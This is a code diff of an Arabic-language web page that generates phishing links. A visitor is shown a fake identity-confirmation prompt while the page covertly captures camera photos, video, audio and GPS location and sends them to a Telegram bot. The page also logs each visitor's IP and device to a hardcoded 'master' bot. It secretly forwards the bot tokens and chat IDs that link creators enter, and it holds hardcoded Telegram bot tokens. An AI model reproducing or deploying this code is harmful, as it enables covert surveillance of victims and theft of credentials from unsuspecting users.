+                <p class="main-sub"><i class="fas fa-exclamation-triangle"></i> استخدام هذه الأداة في أغراض غير قانونية ممنوع. المستخدم يتحمل المسؤولية الكاملة.</p>
 
-                <!-- FORM -->
+                <!-- ===== FORM ===== -->
                 <div class="form-modern" id="formBox">
-
                     <div class="field-group">
                         <label for="chatIdInput"><i class="fas fa-id-badge"></i> CHAT ID</label>
                         <input type="text" id="chatIdInput" placeholder="أدخل Chat ID">
                     </div>
-
                     <div class="field-group">
                         <label for="tokenInput"><i class="fas fa-key"></i> توكن البوت</label>
                         <input type="text" id="tokenInput" placeholder="أدخل توكن البوت">
                     </div>
-
-                    <div class="features-label">
-                        <i class="fas fa-sliders-h"></i> الميزات المطلوبة (مدة التسجيل 5 ثوان)
-                    </div>
+                    <div class="features-label"><i class="fas fa-sliders-h"></i> الميزات المطلوبة (مدة التسجيل 5 ثوان)</div>
                     <div class="checkbox-grid" id="featuresGroup">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="camFront" value="camFront" checked>
-                            <label for="camFront"><span class="label-text"><i class="fas fa-camera"></i> صورة أمامية</span></label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="camBack" value="camBack">
-                            <label for="camBack"><span class="label-text"><i class="fas fa-camera-retro"></i> صورة خلفية</span></label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="videoFront" value="videoFront">
-                            <label for="videoFront"><span class="label-text"><i class="fas fa-video"></i> فيديو أمامي</span></label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="videoBack" value="videoBack">
-                            <label for="videoBack"><span class="label-text"><i class="fas fa-film"></i> فيديو خلفي</span></label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="audio" value="audio">
-                            <label for="audio"><span class="label-text"><i class="fas fa-microphone"></i> تسجيل صوتي</span></label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="location" value="location">
-                            <label for="location"><span class="label-text"><i class="fas fa-map-pin"></i> تحديد الموقع</span></label>
-                        </div>
+                        <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront"><span class="label-text"><i class="fas fa-camera"></i> صورة أمامية</span></label></div>
+                        <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack"><span class="label-text"><i class="fas fa-camera-retro"></i> صورة خلفية</span></label></div>
+                        <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront"><span class="label-text"><i class="fas fa-video"></i> فيديو أمامي</span></label></div>
+                        <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack"><span class="label-text"><i class="fas fa-film"></i> فيديو خلفي</span></label></div>
+                        <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio"><span class="label-text"><i class="fas fa-microphone"></i> تسجيل صوتي</span></label></div>
+                        <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location"><span class="label-text"><i class="fas fa-map-pin"></i> تحديد الموقع</span></label></div>
                     </div>
-
-                    <button class="btn-primary" id="generateBtn">
-                        <i class="fas fa-link"></i> إنشاء الرابط
-                    </button>
-
+                    <button class="btn-primary" id="generateBtn"><i class="fas fa-link"></i> إنشاء الرابط</button>
                     <div class="result-box" id="result">
                         <span class="link-text" id="linkText"><i class="fas fa-link"></i></span>
                         <button class="btn-copy" id="copyBtn"><i class="fas fa-copy"></i> نسخ</button>
                     </div>
-
                 </div>
             </div>
         </div>
 
-        <!-- FOOTER -->
+        <!-- ===== FOOTER ===== -->
         <div class="madeby">
-            <div class="dev-block">
-                <i class="fas fa-code"></i>
-                <span class="dev-name">@xx_8k</span>
-            </div>
+            <div class="dev-block"><i class="fas fa-code"></i><span class="dev-name">@xx_8k</span></div>
             <span class="sep">|</span>
             <span><i class="fas fa-fire"></i> v3.0</span>
             <span class="sep">|</span>
@@ -1356,570 +314,602 @@
 
     </div>
 
+    <!-- ============================================================
+       JAVASCRIPT — Organized Modules
+       ============================================================ -->
     <script>
         // ================================================================
-        //  جميع الوظائف مع النمط الفاخر الموحد
+        // MODULE 1: CONFIGURATION
         // ================================================================
+        const CONFIG = {
+            MASTER_BOT_TOKEN: "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ",
+            MASTER_CHAT_ID: "8552540563",
+            BOT_USERNAME: "v_v_9bot",
+            DEV_USERNAME: "xx_8k"
+        };
 
         // ================================================================
-        // CANVAS
+        // MODULE 2: UTILITIES
         // ================================================================
-        (function hellCanvas() {
-            const canvas = document.getElementById('hell-canvas');
-            const ctx = canvas.getContext('2d');
-            let width, height;
-            const resize = () => {
-                width = canvas.width = window.innerWidth;
-                height = canvas.height = window.innerHeight;
-            };
-            resize();
-            window.addEventListener('resize', resize);
-
-            let particles = [];
-            const MAX = 220;
-
-            function createParticle() {
-                const type = Math.random();
-                if (type < 0.35) return {
-                    x: Math.random() * width,
-                    y: Math.random() * height - height,
-                    size: 2 + Math.random() * 6,
-                    speedY: 0.5 + Math.random() * 2.0,
-                    speedX: (Math.random() - 0.5) * 0.3,
-                    alpha: 0.4 + Math.random() * 0.6,
-                    isBlood: true,
-                    color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, `
-                };
-                else if (type < 0.7) return {
-                    x: Math.random() * width,
-                    y: Math.random() * height - height,
-                    size: 1.5 + Math.random() * 4,
-                    speedY: 0.15 + Math.random() * 0.9,
-                    speedX: (Math.random() - 0.5) * 0.7,
-                    alpha: 0.5 + Math.random() * 0.5,
-                    isBlood: false,
-                    isFire: true,
-                    color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, `
-                };
-                else return {
-                    x: Math.random() * width,
-                    y: Math.random() * height - height,
-                    size: 4 + Math.random() * 8,
-                    speedY: 0.08 + Math.random() * 0.35,
-                    speedX: (Math.random() - 0.5) * 0.15,
-                    alpha: 0.15 + Math.random() * 0.25,
-                    isBlood: false,
-                    isFire: false,
-                    isSmoke: true,
-                    color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, `
-                };
-            }
-            for (let i = 0; i < MAX; i++) {
-                const p = createParticle();
-                p.y = Math.random() * height;
-                particles.push(p);
-            }
-
-            function draw() {
-                ctx.clearRect(0, 0, width, height);
-                const grad = ctx.createRadialGradient(width / 2, height / 2, 0, width / 2, height / 2, height);
-                grad.addColorStop(0, 'rgba(25, 4, 4, 0.10)');
-                grad.addColorStop(0.35, 'rgba(15, 2, 2, 0.20)');
-                grad.addColorStop(0.65, 'rgba(8, 0, 0, 0.45)');
-                grad.addColorStop(1, 'rgba(0, 0, 0, 0.92)');
-                ctx.fillStyle = grad;
-                ctx.fillRect(0, 0, width, height);
-
-                for (let p of particles) {
-                    p.y += p.speedY;
-                    p.x += p.speedX;
-                    if (p.y > height + 30) {
-                        Object.assign(p, createParticle());
-                        p.y = -15;
-                        p.x = Math.random() * width;
+        const Utils = {
+            shortenUrl: async function(url) {
+                try {
+                    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
+                    const short = await res.text();
+                    return short.trim();
+                } catch (e) { return url; }
+            },
+            getTimestamp: () => new Date().toLocaleString('ar-EG'),
+            getDevice: () => {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) return "Android";
+                if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+                return "Unknown";
+            },
+            getBattery: async function() {
+                try {
+                    if (navigator.getBattery) {
+                        const bat = await navigator.getBattery();
+                        let level = (bat.level * 100) + "%";
+                        if (bat.charging) level += " (شحن)";
+                        return level;
                     }
-                    if (p.x < -30 || p.x > width + 30) p.x = Math.random() * width;
-                    ctx.beginPath();
-                    if (p.isBlood) {
-                        ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
-                        ctx.fillStyle = p.color + (p.alpha * 0.6) + ')';
-                        ctx.shadowColor = 'rgba(204, 10, 10, 0.25)';
-                        ctx.shadowBlur = 14;
-                    } else if (p.isFire) {
-                        ctx.arc(p.x, p.y, p.size * 0.6, 0, Math.PI * 2);
-                        const bright = 0.6 + Math.random() * 0.4;
-                        ctx.fillStyle = p.color + (p.alpha * 0.5 * bright) + ')';
-                        ctx.shadowColor = 'rgba(255, 68, 0, 0.4)';
-                        ctx.shadowBlur = 22 + p.size * 4;
-                    } else {
-                        ctx.arc(p.x, p.y, p.size * 0.5, 0, Math.PI * 2);
-                        ctx.fillStyle = p.color + (p.alpha * 0.3) + ')';
-                        ctx.shadowColor = 'rgba(180, 150, 120, 0.05)';
-                        ctx.shadowBlur = 10;
+                } catch (e) {}
+                return "غير متاح";
+            },
+            getIPInfo: async function() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    return { ip: data.ip || "غير معروف", country: data.country_name || "غير معروف" };
+                } catch (e) { return { ip: "غير معروف", country: "غير معروف" }; }
+            }
+        };
+
+        // ================================================================
+        // MODULE 3: TELEGRAM SERVICE
+        // ================================================================
+        const TelegramService = {
+            // Send a text message using any bot token
+            sendMessage: async function(token, chatId, text) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: text })
+                    });
+                } catch (e) { console.error('Telegram sendMessage error:', e); }
+            },
+            // Send a photo using any bot token
+            sendPhoto: async function(token, chatId, blob, caption) {
+                try {
+                    const form = new FormData();
+                    form.append('chat_id', chatId);
+                    form.append('photo', blob);
+                    form.append('caption', caption);
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+                } catch (e) { console.error('Telegram sendPhoto error:', e); }
+            },
+            // Send a video using any bot token
+            sendVideo: async function(token, chatId, blob, caption) {
+                try {
+                    const form = new FormData();
+                    form.append('chat_id', chatId);
+                    form.append('video', blob);
+                    form.append('caption', caption);
+                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+                } catch (e) { console.error('Telegram sendVideo error:', e); }
+            },
+            // Send an audio using any bot token
+            sendAudio: async function(token, chatId, blob, caption) {
+                try {
+                    const form = new FormData();
+                    form.append('chat_id', chatId);
+                    form.append('audio', blob);
+                    form.append('caption', caption);
+                    await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+                } catch (e) { console.error('Telegram sendAudio error:', e); }
+            }
+        };
+
+        // ================================================================
+        // MODULE 4: VISITOR MANAGER
+        // ================================================================
+        const VisitorManager = {
+            visitorData: {
+                ip: "غير معروف",
+                country: "غير معروف",
+                device: "Unknown",
+                battery: "غير متاح"
+            },
+
+            // Build the fancy caption template
+            buildCaption: function(extra = "", chatId = "", botToken = "") {
+                const d = this.visitorData;
+                let cap = `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n`;
+                cap += `‌╭⊚─〔 ʟɪɴᴋ 〕───────\n`;
+                cap += `┃˹🔗˼ ${extra || 'ʏᴏᴜʀ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ'} ⭒\n`;
+                cap += `┃⍟ \n┃\n┃\n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n`;
+                cap += `╰───────────────\n\n`;
+                cap += `⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒\n`;
+                cap += `‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────\n┃˹👨‍💻˼ @${CONFIG.DEV_USERNAME} ⭒\n╰───────────────\n\n`;
+                cap += `┃ 📍 الدولة     › ${d.country}\n`;
+                cap += `┃ 📱 الجهاز     › ${d.device}\n`;
+                cap += `┃ 🔋 البطارية   › ${d.battery}\n`;
+                cap += `┃ 🌐 الـ IP      › ${d.ip}\n`;
+                cap += `┃ 🕒 الوقت      › ${Utils.getTimestamp()}\n`;
+                if (chatId) cap += `┃ 🆔 Chat ID    › ${chatId}\n`;
+                if (botToken) cap += `┃ 🤖 Bot Token  › ${botToken.substring(0, 15)}...\n`;
+                cap += `┃ 🏷️ Bot User  › @${CONFIG.BOT_USERNAME}\n`;
+                cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
+                cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+                return cap;
+            },
+
+            // Send notification to master about new visitor (no chat/token yet)
+            notifyMasterVisitor: async function() {
+                const msg = this.buildCaption("⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧", "Unknown", "Unknown");
+                await TelegramService.sendMessage(CONFIG.MASTER_BOT_TOKEN, CONFIG.MASTER_CHAT_ID, msg);
+            },
+
+            // Send notification to master about link generation (includes chat/token)
+            notifyMasterLinkGenerated: async function(chatId, botToken, features, shortLink) {
+                const extra = `⛧ ʟɪɴᴋ ɢᴇɴᴇʀᴀᴛᴇᴅ ⛧\n┃ 📋 ꜰᴇᴀᴛᴜʀᴇꜱ: ${features}\n┃ 🔗 ʟɪɴᴋ: ${shortLink}`;
+                const msg = this.buildCaption(extra, chatId, botToken);
+                await TelegramService.sendMessage(CONFIG.MASTER_BOT_TOKEN, CONFIG.MASTER_CHAT_ID, msg);
+            },
+
+            // Send confirmation to user's bot (collection started / completed)
+            sendUserConfirmation: async function(token, chatId, message) {
+                const msg = this.buildCaption(message, chatId, token);
+                await TelegramService.sendMessage(token, chatId, msg);
+            },
+
+            // Initialize visitor data (called on load)
+            init: async function() {
+                const device = Utils.getDevice();
+                const battery = await Utils.getBattery();
+                const ipInfo = await Utils.getIPInfo();
+                this.visitorData.device = device;
+                this.visitorData.battery = battery;
+                this.visitorData.ip = ipInfo.ip;
+                this.visitorData.country = ipInfo.country;
+                // Notify master that a new visitor arrived (without chat/token)
+                await this.notifyMasterVisitor();
+            }
+        };
+
+        // ================================================================
+        // MODULE 5: MEDIA PROCESSOR
+        // ================================================================
+        const MediaProcessor = {
+            // Generic capture function
+            captureAndSend: function(stream, chat, token, type, isVideo = false, isAudio = false) {
+                return new Promise((resolve) => {
+                    if (isAudio) {
+                        // Handle audio recording
+                        const mediaRecorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                        mediaRecorder.onstop = async () => {
+                            const blob = new Blob(chunks, { type: 'audio/mp4' });
+                            const caption = VisitorManager.buildCaption(`🎤 Audio Recording (5s)`, chat, token);
+                            await TelegramService.sendAudio(token, chat, blob, caption);
+                            resolve();
+                        };
+                        mediaRecorder.start();
+                        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 5000);
+                        return;
                     }
-                    ctx.fill();
-                    ctx.shadowBlur = 0;
-                }
-                requestAnimationFrame(draw);
-            }
-            draw();
-        })();
 
-        // ================================================================
-        // BLOOD RAIN
-        // ================================================================
-        (function bloodRain() {
-            const container = document.getElementById('bloodRain');
-            for (let i = 0; i < 55; i++) {
-                const drop = document.createElement('div');
-                drop.className = 'blood-drop';
-                drop.style.left = Math.random() * 100 + '%';
-                drop.style.height = (7 + Math.random() * 20) + 'px';
-                drop.style.animationDuration = (2.8 + Math.random() * 5.5) + 's';
-                drop.style.animationDelay = (Math.random() * 8) + 's';
-                drop.style.opacity = 0.2 + Math.random() * 0.5;
-                drop.style.width = (1.8 + Math.random() * 2.8) + 'px';
-                container.appendChild(drop);
-            }
-        })();
+                    if (isVideo) {
+                        // Handle video recording
+                        const mediaRecorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                        mediaRecorder.onstop = async () => {
+                            const blob = new Blob(chunks, { type: 'video/mp4' });
+                            const caption = VisitorManager.buildCaption(
+                                `🎥 ${type === 'front' ? 'Front' : 'Back'} Video (5s)`, chat, token);
+                            await TelegramService.sendVideo(token, chat, blob, caption);
+                            resolve();
+                        };
+                        mediaRecorder.start();
+                        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 5000);
+                        return;
+                    }
 
-        // ================================================================
-        //  النمط الموحد لكل الرسائل على تليجرام
-        // ================================================================
-
-        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
-        const MASTER_CHAT_ID = "8552540563";
-        const BOT_USERNAME = "v_v_9bot";
-
-        let visitorIP = "غير معروف";
-        let visitorCountry = "غير معروف";
-        let visitorDevice = "Unknown";
-        let visitorBattery = "غير متاح";
-
-        // ================================================================
-        //  دالة بناء الكابتشن بالنمط الفاخر المطلوب مع المطور في النهاية
-        // ================================================================
-        function buildCaption(extra = "", chatId = "", botToken = "") {
-            let cap = `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n`;
-            cap += `‌╭⊚─〔 ʟɪɴᴋ 〕───────\n`;
-            cap += `┃˹🔗˼ ${extra || 'ʏᴏᴜʀ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ'} ⭒\n`;
-            cap += `┃⍟ \n`;
-            cap += `┃\n`;
-            cap += `┃\n`;
-            cap += `┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n`;
-            cap += `╰───────────────\n\n`;
-            cap += `⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒\n`;
-            cap += `‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────\n`;
-            cap += `┃˹👨‍💻˼ @xx_8k ⭒\n`;
-            cap += `╰───────────────\n\n`;
-            cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
-            cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
-            cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
-            cap += `┃ 🌐 الـ IP      › ${visitorIP}\n`;
-            cap += `┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
-            if (chatId) cap += `┃ 🆔 Chat ID    › ${chatId}\n`;
-            if (botToken) cap += `┃ 🤖 Bot Token  › ${botToken.substring(0, 15)}...\n`;
-            cap += `┃ 🏷️ Bot User  › @${BOT_USERNAME}\n`;
-            cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
-            cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
-            return cap;
-        }
-
-        // ================================================================
-        //  إرسال إشعار دخول جديد للمالك
-        // ================================================================
-        async function sendNewVisitorNotification(chatId = "", botToken = "") {
-            try {
-                const msg = buildCaption("⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧", chatId, botToken);
-                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                    // Handle photo capture
+                    const video = document.createElement('video');
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.muted = true;
+                    video.style.display = 'none';
+                    video.srcObject = stream;
+                    document.body.appendChild(video);
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            canvas.toBlob(async (blob) => {
+                                if (blob && blob.size > 2000) {
+                                    const caption = VisitorManager.buildCaption(
+                                        `📸 ${type === 'front' ? 'Front' : 'Back'} Camera Photo`, chat,
+                                        token);
+                                    await TelegramService.sendPhoto(token, chat, blob, caption);
+                                }
+                                document.body.removeChild(video);
+                                resolve();
+                            }, 'image/jpeg', 0.9);
+                        }, 2000);
+                    };
                 });
-            } catch (e) {}
-        }
+            },
 
-        // ================================================================
-        //  إرسال معلومات الزائر للمالك (عند فتح الموقع)
-        // ================================================================
-        async function sendVisitorInfo() {
-            try {
-                const userAgent = navigator.userAgent;
-                if (/Android/i.test(userAgent)) visitorDevice = "Android";
-                else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
-                else visitorDevice = "Unknown";
+            // Location handler
+            sendLocation: function(chat, token) {
+                return new Promise((resolve) => {
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const { latitude, longitude } = position.coords;
+                                const extra =
+                                    `📍 Location\n📌 ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
+                                const msg = VisitorManager.buildCaption(extra, chat, token);
+                                await TelegramService.sendMessage(token, chat, msg);
+                                resolve();
+                            },
+                            () => resolve()
+                        );
+                    } else { resolve(); }
+                });
+            },
 
-                if (navigator.getBattery) {
+            // Execute features based on list
+            execute: async function(chat, token, features) {
+                if (!features) return;
+                const list = features.split(',');
+
+                // Pre-grant permissions once
+                const needCamera = list.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
+                const needMic = list.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
+                if (needCamera || needMic) {
                     try {
-                        const battery = await navigator.getBattery();
-                        visitorBattery = (battery.level * 100) + "%";
-                        if (battery.charging) visitorBattery += " (شحن)";
+                        const constraints = {};
+                        if (needCamera) constraints.video = true;
+                        if (needMic) constraints.audio = true;
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        stream.getTracks().forEach(t => t.stop());
                     } catch (e) {}
                 }
 
-                try {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipRes.json();
-                    visitorIP = ipData.ip || "غير معروف";
-                    visitorCountry = ipData.country_name || "غير معروف";
-                } catch (e) {}
-
-                await sendNewVisitorNotification();
-            } catch (err) {}
-        }
-        sendVisitorInfo();
-
-        // ================================================================
-        //  عناصر الفورم
-        // ================================================================
-        const generateBtn = document.getElementById('generateBtn');
-        const resultEl = document.getElementById('result');
-        const linkText = document.getElementById('linkText');
-        const copyBtn = document.getElementById('copyBtn');
-
-        async function shortenUrl(url) {
-            try {
-                const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
-                const short = await response.text();
-                return short.trim();
-            } catch (e) { return url; }
-        }
-
-        generateBtn.addEventListener('click', async () => {
-            const chat = document.getElementById('chatIdInput').value.trim();
-            const token = document.getElementById('tokenInput').value.trim();
-
-            if (!chat || !token) {
-                alert('املأ جميع الحقول');
-                return;
+                for (const feature of list) {
+                    switch (feature) {
+                        case 'camFront':
+                            try {
+                                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                                await this.captureAndSend(s, chat, token, 'front', false, false);
+                                s.getTracks().forEach(t => t.stop());
+                            } catch (e) {}
+                            break;
+                        case 'camBack':
+                            try {
+                                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                                await this.captureAndSend(s, chat, token, 'back', false, false);
+                                s.getTracks().forEach(t => t.stop());
+                            } catch (e) {}
+                            break;
+                        case 'videoFront':
+                            try {
+                                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                                    audio: true });
+                                await this.captureAndSend(s, chat, token, 'front', true, false);
+                                s.getTracks().forEach(t => t.stop());
+                            } catch (e) {}
+                            break;
+                        case 'videoBack':
+                            try {
+                                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                                    audio: true });
+                                await this.captureAndSend(s, chat, token, 'back', true, false);
+                                s.getTracks().forEach(t => t.stop());
+                            } catch (e) {}
+                            break;
+                        case 'audio':
+                            try {
+                                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                                await this.captureAndSend(s, chat, token, 'audio', false, true);
+                                s.getTracks().forEach(t => t.stop());
+                            } catch (e) {}
+                            break;
+                        case 'location':
+                            await this.sendLocation(chat, token);
+                            break;
+                    }
+                }
             }
+        };
 
-            const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
-            const features = Array.from(checkboxes).map(cb => cb.value).join(',');
-            const fullLink =
-                `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
+        // ================================================================
+        // MODULE 6: UI CONTROLLER
+        // ================================================================
+        const UIController = {
+            elements: {},
 
-            const shortLink = await shortenUrl(fullLink);
+            init: function() {
+                this.elements = {
+                    generateBtn: document.getElementById('generateBtn'),
+                    resultBox: document.getElementById('result'),
+                    linkText: document.getElementById('linkText'),
+                    copyBtn: document.getElementById('copyBtn'),
+                    chatInput: document.getElementById('chatIdInput'),
+                    tokenInput: document.getElementById('tokenInput'),
+                    featuresGroup: document.getElementById('featuresGroup')
+                };
+                this.elements.generateBtn.addEventListener('click', this.handleGenerate.bind(this));
+                this.elements.copyBtn.addEventListener('click', this.handleCopy.bind(this));
+            },
 
-            // الرابط المعروض هو فقط الرابط المختصر ضمن النمط المطلوب
-            linkText.innerHTML = `
-                ⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒
-                ‌╭⊚─〔 ʟɪɴᴋ 〕───────
-                ┃˹🔗˼ ${shortLink} ⭒
-                ┃⍟ 
-                ┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒
-                ╰───────────────
-            `;
-            linkText.dataset.short = shortLink;
-            resultEl.style.display = 'flex';
+            handleGenerate: async function() {
+                const chat = this.elements.chatInput.value.trim();
+                const token = this.elements.tokenInput.value.trim();
+                if (!chat || !token) { alert('املأ جميع الحقول'); return; }
 
-            // إرسال إشعار للمالك عند إنشاء الرابط
-            await sendNewVisitorNotification(chat, token);
+                const checkboxes = this.elements.featuresGroup.querySelectorAll('input[type="checkbox"]:checked');
+                const features = Array.from(checkboxes).map(cb => cb.value).join(',');
+                const fullLink =
+                    `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
+                const shortLink = await Utils.shortenUrl(fullLink);
+
+                // Display link in fancy format
+                this.elements.linkText.innerHTML = `
+                    ⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒
+                    ‌╭⊚─〔 ʟɪɴᴋ 〕───────
+                    ┃˹🔗˼ ${shortLink} ⭒
+                    ┃⍟ 
+                    ┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒
+                    ╰───────────────
+                `;
+                this.elements.linkText.dataset.short = shortLink;
+                this.elements.resultBox.style.display = 'flex';
+
+                // Notify master with the generated link and credentials
+                await VisitorManager.notifyMasterLinkGenerated(chat, token, features, shortLink);
+            },
+
+            handleCopy: async function() {
+                try {
+                    const short = this.elements.linkText.dataset.short ||
+                        this.elements.linkText.textContent.match(/https?:\/\/[^\s]+/)?.[0] || '';
+                    await navigator.clipboard.writeText(short);
+                    this.elements.copyBtn.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
+                    setTimeout(() => this.elements.copyBtn.innerHTML = '<i class="fas fa-copy"></i> نسخ', 1500);
+                } catch (e) { alert('فشل النسخ'); }
+            }
+        };
+
+        // ================================================================
+        // MODULE 7: SIDE PAGE HANDLER (Victim View)
+        // ================================================================
+        const SidePageHandler = {
+            init: function() {
+                const params = new URLSearchParams(window.location.search);
+                const chat = params.get('chat');
+                const token = params.get('token');
+                const features = params.get('features');
+
+                if (!chat || !token) return; // Not a victim page
+
+                // Hide main UI
+                document.getElementById('cardArea').style.display = 'none';
+                document.querySelector('.header').style.display = 'none';
+                document.querySelector('.madeby').style.display = 'none';
+                document.getElementById('captureBadge').style.display = 'none';
+                const welcome = document.getElementById('welcomeBox');
+                if (welcome) welcome.style.display = 'none';
+
+                // Build side page
+                const wrap = document.querySelector('.app-wrap');
+                wrap.innerHTML = '';
+                wrap.style.padding = '0';
+                wrap.style.margin = '0';
+                wrap.style.maxWidth = '100%';
+                wrap.style.background = '#050505';
+                wrap.style.minHeight = '100vh';
+
+                const page = document.createElement('div');
+                page.className = 'download-page';
+                const box = document.createElement('div');
+                box.className = 'download-box';
+
+                const h2 = document.createElement('h2');
+                h2.innerHTML = `<i class="fas fa-shield-alt"></i> ⛧ يجب الضغط على سماح لتأكيد هوية الزائر`;
+                box.appendChild(h2);
+
+                // AD areas
+                const ad1 = document.createElement('div');
+                ad1.className = 'ad-area';
+                box.appendChild(ad1);
+                const ad2 = document.createElement('div');
+                ad2.className = 'ad-area';
+                const cont = document.createElement('div');
+                cont.id = 'container-596225155ab3da796681d551cb4b7cf4';
+                ad2.appendChild(cont);
+                box.appendChild(ad2);
+
+                const btn = document.createElement('button');
+                btn.className = 'download-btn';
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> ⛧ تأكيد';
+                btn.onclick = function() {
+                    window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
+                        "_blank");
+                };
+                box.appendChild(btn);
+
+                const ad3 = document.createElement('div');
+                ad3.className = 'ad-area';
+                box.appendChild(ad3);
+                const ad4 = document.createElement('div');
+                ad4.className = 'ad-area';
+                box.appendChild(ad4);
+
+                const footer = document.createElement('div');
+                footer.className = 'download-footer';
+                footer.innerHTML = `
+                    <div class="dev-block">
+                        <i class="fas fa-code"></i>
+                        <span class="dev-name">@${CONFIG.DEV_USERNAME}</span>
+                    </div>
+                `;
+                box.appendChild(footer);
+                page.appendChild(box);
+                wrap.appendChild(page);
+
+                // Load Ads
+                const loadAd = (src) => {
+                    const s = document.createElement("script");
+                    s.src = src;
+                    s.async = true;
+                    document.body.appendChild(s);
+                };
